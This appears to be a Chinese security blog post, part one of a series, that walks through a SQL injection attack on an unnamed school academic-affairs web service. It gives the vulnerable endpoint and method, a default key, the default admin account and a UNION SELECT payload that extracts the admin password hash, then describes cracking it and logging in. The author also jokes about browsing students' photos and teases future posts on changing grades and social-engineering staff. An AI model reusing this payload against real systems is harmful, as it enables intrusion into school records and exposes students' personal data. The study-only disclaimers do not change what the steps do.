---
layout: post
title: 某教务系统注入getshell提权一条龙(上)
date: 2017-03-14 11:14:26
comments: true
tags:
	- 安全攻防
---
### 前言
><font color="#ff0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>

### 正文
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这篇文章是我在去年的时候在土司和90上写的一篇文章，当时也将漏洞详细上报给乌云了。今时不同往日，如今乌云关了，<!--more-->土司也太久没登成了僵尸号。于是把文章搬过来，凑下文章篇数。

### 漏洞详情
 >今天的目标

![](/images/pasted-45.png)

 >找到webservice接口，路径在service.asmx

![](/images/pasted-46.png)

>漏洞在于
> * GetStuCheckinInfo
>这个接口

![](/images/pasted-47.png)

> 我们只需要关注`xh`和 `strKey` 这两个节点就可以了。

> 其中的strKey都是默认的`KKKGZ2312`

> `Xh`这个节点就是我们的注入语句了。

poc:
```sql
222222' union select 
Null,kl,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null
,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null from yhb where yhm='jwc01
```

>yhb   用户表
>yhm   用户名
>kl    口令

>表示查询的是yhm表中jwc01的kl记录。(该教务系统默认管理员是jwc01)

>构造好语句开始注入

![](/images/pasted-48.png)

>可以看到jwc01用户的密码密文出来了。

>我们拿去解密

![](/images/pasted-49.png)

>Ok可以登录了

![](/images/pasted-50.png)

>Bingo

![](/images/pasted-51.png)

>靓女多多，

![](/images/pasted-52.png)


### 总结
> 不想让文章太长，getshell提权部分就放在下篇。
> 后期还会写更多的渗透文章，漫游内网，更改led大屏幕，免费上网，好(gai)好(cheng)学(ji)习，社工辅导员qq微博等等。
>再次提醒：
> **文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**